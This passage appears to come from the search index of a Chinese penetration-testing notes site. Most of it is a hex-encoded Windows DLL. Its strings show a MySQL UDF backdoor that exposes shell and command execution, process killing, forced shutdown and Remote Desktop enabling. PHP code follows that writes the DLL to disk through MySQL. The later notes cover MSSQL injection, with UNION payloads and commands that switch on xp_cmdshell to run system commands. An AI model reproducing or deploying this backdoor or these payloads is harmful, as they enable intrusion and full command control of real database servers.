BF18B0E8B41083B0534600010740D50E855FFFFFF59EB1389068BC88B41043B480874F48B0E394108740289065EC38B44240485C0740E8B4C24088B1189108B4904894804C353568BF133DB895E04C74608A049001068C849001053C706B8490010C74608AC490010FF15D8400010834E0CFF5959885E10899E18010000899E1C010000C78614010000010000008BC65E5BC3558BECB800200000E80C0B00008D451050FF750C8D8500E0FFFF50FF15D44000108B4D088B1183C40C508D8500E0FFFF50FF5204C9C3568BF1E814000000F644240801740756E8A10A0000598BC65EC20400568BF18B861C01000085C0C706B8490010C74608AC490010740750FF15584000108B861801000085C0578B3DA4400010740350FFD78B460C83F8FF740350FFD783BE14010000005F740F8D4610803800740750FF15AC400010C706804900105EC3566820010000E8450A000085C059740B8BC8E8E9FEFFFF8BF0EB0233F685F674068B0656FF50048BC65EC3558BEC518365FC00837D0CFF568BF1750CFF7508E8060A00005989450C837E04FF75106A016A008D4EF8E82100000085C074186A008D45FC50FF750CFF7508FF7604FF15984000108B45FC5EC9C20800558BEC81EC04010000568BF1578DBE1C0100008B0785C0740A50FF15584000108327008DBE180100008B0785C0538B1DA4400010740650FFD38327008B460C83F8FF740750FFD3834E0CFF83BE1401000000740F8D4610803800740750FF15AC400010837D08007412FF75088D7E1057E8E2090000595933DBEB278D85FCFEFFFF506804010000FF156C4000108D7E105733DB53538D85FCFEFFFF50FF156840001053536A02535368000000C057FF156440001083F8FF89460C5B7507C6070033C0EB0C8B450C89861401000033C0405F5EC9C208008B5424048B4208568B308972088B303B353460001074038956048B72048970048B49043B51045E7505894104EB0E8B4A043B1175048901EB038941088910894204C204008B41048B48048B15346000103BCA741A568B7424088B3639710C7D058B4908EB048BC18B093BCA75EE5EC204005356578B7C24103B3D346000108BD98BF7741DFF76088BCBE8E3FFFFFF8B3657E8520800003B3534600010598BFE75E35F5E5BC20400558BEC83EC105356894DF8578B7D0C8D4D0CE8AAFCFFFF8B37A1346000103BF08D5F08897DFC895DF475048B33EB188B0B3BC8741251E8F1FBFFFF8945FC83C0088B30598945F48D4DF0FF15B84000108B45FC3BC774608B0F8941048B0F89083B037505894604EB178B48048B55F4894E048B480489318B0B890A8B0B8941048B5DF88B4B043979047505894104EB0E8B4F04393975048901EB038941088B4F048948048B48148B5714895014894F14897DFC8BC7EB7B8B48048B55F8894E048B4A043979047505897104EB0E8B4F04393975048931EB038971088B4A043939894DF475238B1B3B1D3460001075078B5F048919EB1256E830FBFFFF8B55F8598B4DF489018B45FC8B5A04397B08751F8B0F3B0D3460001075088B4F04894B08EB0D56E8EEFAFFFF8943088B45FC598B5DF833FF473978140F850B010000E9B9000000397E140F85FA0000008B4E048B013BF075728B410883781400751A8978148B460483601400FF76048BCBE8E7FDFFFF8B46048B40088B0839791475088B4808397914746E8B480839791475178B0889791483601400508BCBE8A1FAFFFF8B46048B40088B4E048B49148948148B4E048979148B4008897814FF76048BCBE894FDFFFFEB7F8378140075198978148B460483601400FF76048BCBE860FAFFFF8B46048B008B4808397914751C8B083979147515836014008B76048B43043B70040F853BFFFFFFEB3C8B0839791475178B480889791483601400508BCBE836FDFFFF8B46048B008B4E048B49148948148B4E048979148B00897814FF76048BCBE8FBF9FFFF897E148D4DF0FF15BC400010FF75FCE8E7050000FF4B0C8B4508598B4D0C5F5E89085BC9C20800558BEC51568BF1837E0C008B4D0C74388B46043B087531394510752CFF70048BCEE837FDFFFF8B0D346000108B46048948048B460483660C0089008B46048940088B46048B08EB253B4D107420578BF98D4D0CE8FCF9FFFF578D45FC508BCEE82FFDFFFF8B4D0C3B4D1075E25F8B450889085EC9C20C00558BEC5156578B7D0C578BF1E8A8FCFFFF8B76043BC689450C740C8B0F3B480C7C058D450CEB068975FC8D45FC8B088B45085F89085EC9C20800558BEC51515356576A188BF9E8290500008BF05933DB8D4DF8895E04C74614010000008975FCFF15B8400010391D346000107513893534600010891EA134600010895DFC895808FF05386000108D4DF8FF15BC400010395DFC7409FF75FCE8C0040000598B35346000106A18E8C9040000897004895814894704895F0C5989008B47045F5E8940085BC9C3558BEC5356576A188BD9E8A00400008B7510FF75148BF883671400897704A1346000108907A1346000108947088D470C50E812F9FFFF83C40CFF430C3B730474258B450C3B0534600010751A8B45148B003B460C7C10897E088B43043B7008751C897808EB17893E8B43043BF075088978048B4304EBEA3B30750289388B43043B78048BF70F84B00000008B4604837814000F85A30000008B50048B0A3BC175598B4A0883791400751E8B560433C0408942148941148B46048B4004836014008B46048B7004EB673B7008750A8BF0568BCBE8D9FAFFFF8B4604C74014010000008B46048B4004836014008B4604FF70048BCBE8A0F7FFFFEB358379140074AA3B30750A8BF0568BCBE88AF7FFFF8B4604C74014010000008B46048B4004836014008B4604FF70048BCBE881FAFFFF8B43043B70040F8550FFFFFF8B43048B4004C74014010000008B450889385F5E5B5DC21000558BEC51568BF18B46048B0850518D45FC508BCEE857FDFFFFFF7604E8230300008366040083660C00598D4DFC33F6FF15B8400010FF0D38600010750D8B3534600010832534600010008D4DFCFF15BC40001085F6740756E8E7020000595EC9C3558BEC515356578BF98B47048B70048BD8A1346000103BF0B201741C8B4D0C8B093B4E0C8BDE0F9CC284D274048B36EB038B76083BF075E9807F08007405FF750CEB2684D28BCB894DFC74128B47043B1874EB8D4DFCE8CEF6FFFF8B4DFC8B510C8B450C3B107D195053568D450C508BCFE8D5FDFFFF8B088B4508C6400401EB078B4508C64004005F5E89085BC9C20800568BF18D461450FF15704000108D4E045EE9F8FEFFFF558BEC515153568BF18D461457508945F8FF15784000108D4508508D45FC8D5E04508BCBE8B6FCFFFF8B7DFC3B7E0874198B471085C074068B0850FF5108578D4508508BCBE8B1F9FFFFFF75F8FF15744000105F5E5BC9C20400558BEC5151FF750C8D45F850E8EEFEFFFF8B45088B4DF889088A4DFC884804C9C20800568BF18D4E04C6410800E88DFCFFFF8326008D461450FF157C4000108BC65EC3558BEC83EC108B45088B008365FC008945F88D45F8508D45F050E89EFFFFFF8B0083C010C9C20400558BEC518B4518568B75148326008308FF837D0C00894DFC750CA1146000108906E94A010000538B1DCC400010578B7D1068784A0010FF37FFD385C059590F842301000068744A0010FF37FFD385C059590F8410010000E8E2F6FFFF8BF085F6750E8B4514C700644A0010E9FE00000068604A0010FF37FFD385C0595975158D46085057FF750CE809E4FFFF83C40CE99700000068584A0010FF37FFD385C05959750F8D46085057FF750CE84AE4FFFFEBDA684C4A0010FF37FFD385C05959750F57FF750C8D460850E892EDFFFFEBBC68484A0010FF37FFD385C05959750F57FF750C8D460850E850E7FFFFEB9E68404A0010FF37FFD385C05959750F57FF750C8D460850E8FFF1FFFFEB808D7E088B0768284A001057FF50088B0759596AFFFF35146000108BCFFF50048BCEE88BF3FFFF8B4D1489018BCEE8E8F3FFFF8B5DFC8B4D188D7B14578901FF15784000108D4508508D4B04E87CFEFFFF578930FF1574400010EB07A11460001089065F5B33C05EC9C21400FF742404E80200000059C3FF2500410010FF25F4400010FF25F0400010FF25E8400010CCCCCCCCCCCCCCCCCCCC513D001000008D4C2408721481E9001000002D0010000085013D0010000073EC2BC88BC485018BE18B088B400450C3CCFF25C4400010CCCCCCCCCCCCCCCCCCCC6AFF5064A100000000508B44240C64892500000000896C240C8D6C240C50C3CCFF25E0400010FF25DC400010FF25D04000108B44240885C0750E39053C6000107E2EFF0D3C6000108B0D1041001083F8018B09890D40600010753F6880000000FF150841001085C059A348600010750433C0EB66832000A14860001068046000106800600010A344600010E8EA000000FF053C6000105959EB3D85C07539A14860001085C074308B0D44600010568D71FC3BF072128B0E85C97407FFD1A14860001083EE04EBEA50FF150041001083254860001000595E6A0158C20C00558BEC538B5D08568B750C578B7D1085F67509833D3C60001000EB2683FE01740583FE027522A14C60001085C07409575653FFD085C0740C575653E815FFFFFF85C0750433C0EB4E575653E80BE4FFFF83FE0189450C750C85C07537575053E8F1FEFFFF85F6740583FE037526575653E8E0FEFFFF85C0750321450C837D0C007411A14C60001085C07408575653FFD089450C8B450C5F5E5B5DC20C00FF25C8400010FF2524410010FF2518410010FF251C410010FF2520410010FF2538410010FF253C410010FF25344100108D4DDCE9C2E1FFFFB8884A0010E934FEFFFF00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000BE4F0000AC4F00009C4F0000884F00007A4F0000644F0000504F00003C4F0000244F00000C4F0000DE4F0000D04F000000000000724D0000824D0000904D0000A24D0000B24D0000C84D0000E04D0000F84D0000084E00001E4E0000304E00005E4D00004C4E00005A4E00006E4E00007E4E0000964E0000AE4E0000C64E0000504D00003E4D00002C4D00001C4D0000104D0000FA4C0000EE4C0000E64C0000D64C0000C84C0000B44C00003E4E0000A44C000000000000325000001850000000000000D65000003A51000022510000185100000C51000000510000F4500000EA500000CC500000C2500000B8500000A85000009E50000092500000645000006C500000745000007E5000008850000046510000000000006C510000845100009A5100005651000000000000F04E000000000000E2510000B4510000C451000000000000FC4F00000000000000000000636D642E657865202F6320257300000055736167653A636D6420226E65742075736572220D0A0D0A0000000055736167653A6578656320226E65742075736572220D0A0D0A000000CB120010000000000D0A7073202D6C0920C1D0B3F6CBF9D3D0BDF8B3CC0D0A7073202D6D73206E616D650920C1D0B3F6BCD3D4D8C1CBD6B8B6A8C4A3BFE9C3FBB5C4BDF8B3CC0D0A7073202D6D70207069640920C1D0B3F6D6B8B6A8BDF8B3CCB5C4CBF9D3D0C4A3BFE90D0A7073202D6B70207069640920B9D8B1D5D2BBB8F6BDF8B3CC0D0A7073202D6B6E206E616D650920B9D8B1D5CBF9D3D0D6B8B6A8B5C4BDF8B3CCC3FB0D0A0000002573093C3078252E38583E0D0A0000004D6F64756C65506174680942617365416464726573730D0A0000000025640925735C25730925730D0A000000456E756D50726F6365737365732829206572726F722E0D0A000000005365446562756750726976696C656765000000007073202D6B6E206E616D650D0A7073202D6B70207069640D0A0000007073202D6D73206E616D650D0A7073202D6D70207069640D0A00000052746C41646A75737450726976696C65676500005A7753687574646F776E53797374656D000000004E54444C4C2E444C4C0000004661696C656420546F2053687574646F776E00004661696C656420546F205265626F6F74000000004661696C656420546F204C6F676F66660000000049732054616B696E6720506C6163652E2E2E2E2E2E0D0A00536553687574646F776E50726976696C656765000000000055534147453A0D0A20202020202073687574646F776E205B202D30313233345D0D0A2020202020202D30202020206C6F676F66662E0D0A2020202020202D31202020207265626F6F742E0D0A2020202020202D3220202020706F7765726F66662E0D0A2020202020202D33202020207375706572207265626F6F742E0D0A2020202020202D342020202073757065722073687574646F776E2E0D0A6578616D706C653A0D0A20202020202073687574646F776E202D330D0A0000000077696E7374612E646C6C000057696E53746174696F6E5265736574005554494C444C4C2E646C6C00537472436F6E6E656374537461746500252D3131642020252D3133732020252D3133732020252D3133732020252D313573202025730D0A00202020200000000025642E25642E25642E25640053657373696F6E49442020202053657373696F6E4E616D6520202020557365724E616D6520202020202020436C69656E744E616D6520202020202020495020202020202020202020202020202053746174650D0A00000000456E756D6572617465205465726D696E616C2053657373696F6E73204661696C65642E2025640D0A000000004661696C20546F20536574204E6577205465726D696E616C205365727669636520506F72740D0A00546865205465726D696E616C205365727669636520506F727420486173204265656E2053657420546F2025640D0A00000000000053595354454D5C43757272656E74436F6E74726F6C5365745C436F6E74726F6C5C5465726D696E616C205365727665725C57696E53746174696F6E735C5244502D54637000000000506F72744E756D62657200006644656E795453436F6E6E656374696F6E73000053595354454D5C43757272656E74436F6E74726F6C5365745C436F6E74726F6C5C5465726D696E616C20536572766572000000005453456E61626C656400000053595354454D5C43757272656E74436F6E74726F6C5365745C53657276696365735C5465726D5365727669636500000053595354454D5C43757272656E74436F6E74726F6C5365745C53657276696365735C5465726D44440000000053746172740000005465726D696E616C2053657276696365205374617475733A2025730D0A00000044697361626C656400000000456E61626C6564005265674F70656E4B65794578204572726F722E0D0A0000005465726D696E616C205365727669636520506F72743A2025640D0A00536574204E6577205465726D696E616C2053657276696365204661696C65640D0A000000536574205465726D696E616C20536572766963652044697361626C65640D0A00536574205465726D696E616C205365727669636520456E61626C65642E0D0A006C6F676F666600007175657279000000766965770000000064697361626C6500656E61626C65000070000000000000004445534352495054494F4E3A0D0A202020202020202020202020436F6E666967205465726D696E616C205365727669636520537570706F72747320323030302F78702F323030332E0D0A55534147453A0D0A2020202020207465726D737663202D656E61626C65202D64697361626C65202D76696577202D70203C6E6577706F72743E202D7175657279202D6C6F676F6666203C73657373696F6E2069643E0D0A2020202020202D656E61626C6520202020456E61626C65205465726D696E616C20536572766963652E0D0A2020202020202D64697361626C6520202044697361626C65205465726D696E616C20536572766963652E0D0A2020202020202D7669657720202020202056696577205465726D696E616C20536572766963652053657474696E67732E0D0A2020202020202D70202020202020202020536574204E6577205465726D696E616C205365727669636520506F72742E0D0A6578616D706C653A0D0A2020202020207465726D737663202D71756572790D0A2020202020207465726D737663202D6C6F676F666620310D0A2020202020207465726D737663202D656E61626C65202D7020333339390D0A2020202020207465726D737663202D7020333339390D0A2020202020207465726D737663202D766965770D0A0099210010D1210010E22100100C2200100000000000000000C000000000000046762F0010762F0010762F0010F7230010D5240010F723001099210010D1210010E22100102D2400102E4F4350000000000D0A68656C700D0A436D6420202020202020202D3E0D0A45786563202020202020202D3E0D0A53687574646F776E2020203D3E0D0A70732020202020202020203D3E0D0A5465726D537663202020203D3E0D0A0D0A000000556E6B6E6F776E20436F6D6D616E642E3A28200D0A0D0A005465726D537663007073000073687574646F776E000000004578656300000000436D6400455F4F55544F464D454D4F52590000003F00000068656C7000000000FFFFFFFFFA3000102005931901000000804A0010000000000000000000000000000000008C4B00000000000000000000E24E000034400000844C00000000000000000000004F00002C410000584B00000000000000000000EE4F0000004000009C4C000000000000000000000E50000044410000104C000000000000000000004C500000B84000001C4C000000000000000000002E510000C4400000704C00000000000000000000AA510000184100008C4C00000000000000000000FA510000344100000000000000000000000000000000000000000000BE4F0000AC4F00009C4F0000884F00007A4F0000644F0000504F00003C4F0000244F00000C4F0000DE4F0000D04F000000000000724D0000824D0000904D0000A24D0000B24D0000C84D0000E04D0000F84D0000084E00001E4E0000304E00005E4D00004C4E00005A4E00006E4E00007E4E0000964E0000AE4E0000C64E0000504D00003E4D00002C4D00001C4D0000104D0000FA4C0000EE4C0000E64C0000D64C0000C84C0000B44C00003E4E0000A44C000000000000325000001850000000000000D65000003A51000022510000185100000C51000000510000F4500000EA500000CC500000C2500000B8500000A85000009E50000092500000645000006C500000745000007E5000008850000046510000000000006C510000845100009A5100005651000000000000F04E000000000000E2510000B4510000C451000000000000FC4F00000000000071025365744C6173744572726F7200009E025465726D696E61746550726F6365737300001B00436C6F736548616E646C65001A014765744C6173744572726F7200009602536C65657000DF02577269746546696C6500CE0257616974466F7253696E676C654F626A6563740018025265616446696C650000F9015065656B4E616D65645069706500440043726561746550726F63657373410000500147657453746172747570496E666F41004300437265617465506970650000F70047657443757272656E7450726F63657373006D014765745469636B436F756E740000EF014F70656E50726F63657373003E0147657450726F63416464726573730000C2014C6F61644C696272617279410000D2025769646543686172546F4D756C74694279746500B001496E7465726C6F636B6564496E6372656D656E740000AD01496E7465726C6F636B656444656372656D656E740000D6014D6170566965774F6646696C6500350043726561746546696C654D617070696E67410000B002556E6D6170566965774F6646696C6500120147657446696C6553697A6500570044656C65746546696C654100340043726561746546696C654100630147657454656D7046696C654E616D65410000650147657454656D7050617468410000550044656C657465437269746963616C53656374696F6E00C1014C65617665437269746963616C53656374696F6E00006600456E746572437269746963616C53656374696F6E0000AA01496E697469616C697A65437269746963616C53656374696F6E004B45524E454C33322E646C6C0000D3004578697457696E646F77734578005553455233322E646C6C0000170041646A757374546F6B656E50726976696C6567657300F5004C6F6F6B757050726976696C65676556616C7565410042014F70656E50726F63657373546F6B656E0000EF004C6F6F6B75704163636F756E745369644100D000476574546F6B656E496E666F726D6174696F6E005B01526567436C6F73654B6579007B01526567517565727956616C7565457841000072015265674F70656E4B657945784100860152656753657456616C75654578410000640152656744656C65746556616C7565410071015265674F70656E4B657941005E015265674372656174654B6579410041445641504933322E646C6C00002E00436F496E697469616C697A65457800006F6C6533322E646C6C000B013F3F315F4C6F636B697440737464404051414540585A0000A2003F3F305F4C6F636B697440737464404051414540585A00004D5356435036302E646C6C005753325F33322E646C6C00003D0261746F6900005E02667265650000B202737072696E74660091026D616C6C6F63000059015F6D6273636D70005F015F6D627369636D700000BE027374726C656E00000F003F3F3240594150415849405A0000C502737472737472000099026D656D7365740000E6027763736C656E000049005F5F4378784672616D6548616E646C65720096026D656D636D70000092015F7075726563616C6C00AD027365746C6F63616C6500DC0276737072696E74660000BA027374726370790000C1015F73747269636D7000004D53564352542E646C6C00000F015F696E69747465726D009D005F61646A7573745F6664697600000C004765744D6F64756C65426173654E616D654100000E004765744D6F64756C6546696C654E616D6545784100000400456E756D50726F636573734D6F64756C657300000500456E756D50726F6365737365730050534150492E444C4C000800575453467265654D656D6F7279000C00575453517565727953657373696F6E496E666F726D6174696F6E41000600575453456E756D657261746553657373696F6E73410057545341504933322E646C6C000057494E494E45542E646C6C0000000000000000000000000000000000BFC7514B00000000665200000100000003000000030000004852000054520000605200003314000020140000F4130000725200007852000085520000000001000200546573745544462E646C6C007368656C6C007368656C6C5F6465696E6974007368656C6C5F696E69740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000D0490010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000140100000F30163039304E305D307330C430F630043110313F3166317C319C31A531BD31F6310F3231323B3242325A327432B332C632D532193336338733A433F833013407340D34293439349634B234C334DB34033510356D357E359D351436CD36D436DC360137373723383238623874389D38B8382B3969398D39AF39E839013A113A403A483A5D3A713A803ACE3ADF3AE53AF33AF83A063B403B503B693B723B823B8B3B9B3BA43BE43B033C123C1B3C203C263C2D3C343C4A3C533C583C5E3C653C6C3CA53CAB3CC43C333D443D683D6F3D7C3D833D9F3DFC3D013E1E3E2C3E4F3E553E803E9E3EA33EC63EEF3EF63E023F203F403F573F603F713F813F8C3F963FBF3FC53FDC3FF63FFF3F000000200000F0000000283051305830653076308E30B230D230E130F53012312C3146315D317231A431DB31EE3116323C32533268328532A832B332BE32D432F43245336D33B633BB33C233C933CF33143456345D34663475349E34A4341935413555358435AE35C335D5350C36473675369336BC36EE368B37B637F0383739E839EE39F639FD39093A123A263A6A3A713A913AD03BD63BDE3BE43BEE3B123C9A3CBA3CF63C3C3D873D953D9E3DB13DD33DDD3D013E1F3E3D3E5B3E7E3E8E3EB83ECD3ED43EF03EF63EFC3E023F423F723F783F7E3F8C3F943F9A3FA53FB23FBA3FC83FCD3FD23FD73FE23FEF3FF93F000000300000280000000E301A30203042305430B030CC30D230D830DE30E430EA30F030F63003310000004000002C00000098318039843988398C39A039A439A839AC39B039B439B839BC39C039C439843A903A0000006000000C00000014300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000,CHAR))'); if (mysql_errno($conn) != 0) { echo mysql_error().''; mysql_close($conn); exit(); } mysql_query('select c from udftmp into dumpfile \"'.$path.'\"'); if (mysql_errno($conn) != 0) { echo mysql_error(). ''; mysql_query('drop table udftmp'); mysql_close($conn); exit(); } mysql_query('drop table udftmp'); if (mysql_errno($conn) !=0) echo 'Dump DLL Failed.'.mysql_error(); else echo 'Dump DLL Success!'; mysql_close($conn); } ?> MSF 参数 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-25 15:14:07 "},"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/04.MSSQL/01.常用符号:函数:语句归类.html":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/04.MSSQL/01.常用符号:函数:语句归类.html","title":"01.常用符号:函数:语句归类","keywords":"","body":" 常用符号 注释符 运算符 全局变量 常见函数 数据库信息 数据类型转换 字符串操作函数 字符串拼接 条件函数 延时函数 其他函数/语句 常用语句 常用符号 注释符 注释符 释义 -- -+--+ SQL注释风格 ;%00 空字节 /*...*/ C注释风格 运算符 运算符 释义 + 加法运算 - 减法运算 * 乘法运算 / 除法运算，如果两个表达式值都是整数，那么结果只取整数值，小数值将略去 % 取模运算，返回两数相除后的余数 & 位与逻辑运算 ｜ 位或逻辑运算 ^ 位异或运算 = 等于 <> != 不等于 小于 > 大于 ! 不小于 小于等于 ... ... 全局变量 变量 释义 @@VERSION SQL Server 版本 @@SEVERNAME 运行SQL Server 的本地服务器名称 常见函数 数据库信息 函数 释义 DB_NAME()DB_NAME(n) 获取当前数据库名，有n则获取其他数据库名，n为数字1、2、3... USER_NAME()USERsystem_usercurrent_user 获取用户在数据库中的名字 is_srvrolemember('sysadmin')is_srvrolemember('db_owner')is_srvrolemember('public') 判断当前用户权限 数据类型转换 函数 释义 ASCII(str) 返回字符表达式最左端字符的ASCII 码值 CHAR(str) 将ASCII 码转换为字符 cast(16 as VARBINARY(50)) 将16转换为16进制 CONVERT(VARBINARY(50),16) 将16转换为16进制 master.dbo.fn_varbintohexstr(16) 将16转换为16进制 STR(n) 将数值型数据转为字符型数据 字符串操作函数 函数 释义 SUBSTRING (， ， length) 返回从字符串左边第starting_position个字符起切割length个字符 LEFT (， ) 返回character_expression 左起 integer_expression 个字符 RIGHT (， ) 返回character_expression 右起 integer_expression 个字符 QUOTENAME ([， quote_ character]) 返回被特定字符括起来的字符串 REPLICATE (character_expression,integer_expression) 返回一个重复 character_expression 指定次数的字符串 REVERSE () 将指定的字符串的字符排列顺序颠倒 REPLACE (， ， ) 用string_expression3 替换在string_expression1 中的子串string_expression2 SPACE () 返回一个有指定长度的空白字符串 STUFF (， ， ，) 用另一子串替换字符串指定位置、长度的子串 CHARINDEX (， ) 返回字符串中某个指定的子串出现的开始位置其中substring_expression 是所要查找的字符表达式，expression 可为字符串也可为列名表达式。如果没有发现子串，则返回0 值。 此函数不能用于TEXT 和IMAGE 数据类型。 PATINDEX (， ) 其中子串表达式前后必须有百分号“%”否则返回值为0。返回字符串中某个指定的子串出现的开始位置。与CHARINDEX 函数不同的是，PATINDEX函数的子串中可以使用通配符，且此函数可用于CHAR、 VARCHAR 和TEXT 数据类型。 字符串拼接 函数/语句 释义 CONCAT(text1, [text2],…) 连接字符串函数，MSSQL 2012+ 支持 CONCAT_WS ( separator, argument1, argument2 [, argumentN]... ) 连接字符串函数，SQL Server 2017 (14.x) and later 条件函数 函数/语句 释义 IF...ELSE... 条件语句 case when exp then state1 ELSE state2 end 条件语句 延时函数 函数/语句 释义 WAITFOR DELAY '0:0:n' 延迟n s 其他函数/语句 函数/语句 释义 LEN(str) 计算字符串长度 LOWER(str) 将字符串的大写字母全部转成小写 UPPER(str) 将字符串的小写字母全部转成大写 LTRIM() 字符串头部的空格去掉 RTRIM() 把字符串尾部的空格去掉 常用语句 更多参考：https://bak.gm7.org/sqlwiki.netspi.com/attackQueries/informationGathering/index.html#sqlserver 说明 语句 查看数据库权限 select is_srvrolemember('sysadmin')select is_srvrolemember('db_owner')select is_srvrolemember('public') 获取系统相关信息 -- 获取版本select @@version;-- 获取用户名select user;-- 获取服务器主机名select @@servername;-- 获取所有用户select name from master..syslogins 获取数据库 -- 当前数据库select db_name();-- 其他数据库,n为number类型，1、2、3、4...select db_name(n);-- 其他数据库，修改后面dbid为 1 2 3 select name from master.dbo.sysdatabases where dbid=1-- 所有数据库select name from master..sysdatabases; 获取表 select name from test..sysobjects where xtype = 'u'-- 第一张表select top 1 name from 库名.dbo.sysobjects where xtype='U'-- 第二张表select top 1 name from 库名.dbo.sysobjects where xtype='U' and name not in('第一张表')-- 第三张表select top 1 name from 库名.dbo.sysobjects where xtype='U' and name not in(‘第一张表’,’第二张表’)-- 或者-- 每个库都有information_schema，可以不用加test，也支持跨库查，需要注意这样查询出来使用视图的select table_name from test.information_schema.tables-- 从当前库获取表，去除视图select table_name from information_schema.tables where table_type not in ('view'); 获取列 select name from test..syscolumns where id = (select id from test..sysobjects where name = 'users')-- 或者select column_name from test.information_schema.columns where table_name = 'users';-- 或者，以下不支持跨库查询select top 1 col_name(object_id('users'),1) from sysobjects;-- i 为第几个字段，int型select top 1 col_name(object_id('users'),i) from sysobjects; 获取值 select username, password from users; 查找存储过程 select * from master..sysobjects where name like 'sp%' order by name desc 判断XP_CMDSHELL是否存在 (select count(*) FROM master.dbo.sysobjects Where xtype = 'X' AND name = 'xp_cmdshell') 执行系统命令 -- 开启xp_cmdshell扩展存储过程use master;exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'xp_cmdshell',1;reconfigure;-- 执行系统命令use master;exec master..xp_cmdshell \"whoami\"; Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-25 15:14:08 "},"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/04.MSSQL/02.各种注入手法.html":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/04.MSSQL/02.各种注入手法.html","title":"02.各种注入手法","keywords":"","body":" 前情提要 联合查询(UNION)注入 概念 注意 注入流程 确认字段 确认显位 查询数据 总结 报错注入 概念 注入举例 报错函数 convert() cast() 除法 db_name() file_name() filegroup_name() col_name() object_name() type_name() schema_name() 其他函数 having 1=1 爆表名 group by ... having 1=1 爆列名 盲注 布尔盲注 注入判断 常用函数 注入举例 时间盲注 注入判断 常用函数 注入举例 DNS带外(OOB)注入 概念 利用举例 堆叠注入 Order by 注入 概念 注入判断 注入举例 开启报错 关闭报错 二次注入 文件读写 概述 读 写 DB_owner权限LOG备份Getshell DB_owner权限差异备份Getshell 技巧 查询当前执行的SQL语句 一次查询获取所有内容 前情提要 漏洞环境可以使用https://github.com/Larryxi/MSSQL-SQLi-Labs 或者网上找一些开放的靶场，比如 https://www.mozhe.cn/bug/detail/SXlYMWZhSm15QzM1OGpyV21BR1p2QT09bW96aGUmozhe 大多数注入方法都与MYSQL注入篇相似，但是MSSQL比MYSQL相对权限要更大 联合查询(UNION)注入 概念 和Mysql可以说是一模一样，只是一些语句不同而已，如果可以操作SQL语句且有回显的情况下，就可以通过union构造语句返回直接返回结果。 注意 union查询时，我们构造的select语句的字段数要和当前表的字段数相同才能联合查询，否则会抛出异常（可能是页面不会显示内容或者直接提示错误等） 若回显仅支持第一行数据的话，我们需要让union前边正常查询的语句返回的结果为空，才能让我们想要的数据展现出来；返回为空只需要让union前面的内容在数据库中查询不到结果即可 union，union all区别 union: 对两个结果集进行并集操作，不包括重复行，同时进行默认规则的排序 union all: 对两个结果集进行并集操作，包括重复行，不进行排序 注入流程 确认字段 order by 4 -- 页面正常 order by 5 -- 页面不正常 说明有4列字段 确认显位 id=-2 union all select '1','2','3','4' 加-是为了让union查询前部分无结果，以便显示后部分的查询结果 这里1 2 3 4都用单引号引起来，是因为如果直接用数字型的1 2 3 4，有些地方类型转换会出现错误，导致无法显示出来，所以建议用'1'或者null 可以很明显的看出来显位是2和3 查询数据 查询是否是sysadmin，以及本地服务器名称 id=-2 union all select '1',str(is_srvrolemember('sysadmin')),@@servername,'4' 查询当前数据库和数据库用户 -2 union all select '1',db_name(),user,'4' 使用如下方法也可以查询当前数据库名 id=-2 union all select '1',catalog_name,'3','4' from information_schema.schemata 查询其他数据库 第一种方法：可以直接通过遍历db_name(n)中的n值来查询 id=-2 union all select '1',db_name(1),db_name(2),'4' 第二种方法：也可以通过查询master..sysdatabases来获取数据库名 id=-2 union all select '1',name,'3','4' from master..sysdatabases -- master id=-2 union all select '1',name,'3','4' from master..sysdatabases where name != 'master' -- model id=-2 union all select '1',name,'3','4' from master..sysdatabases where 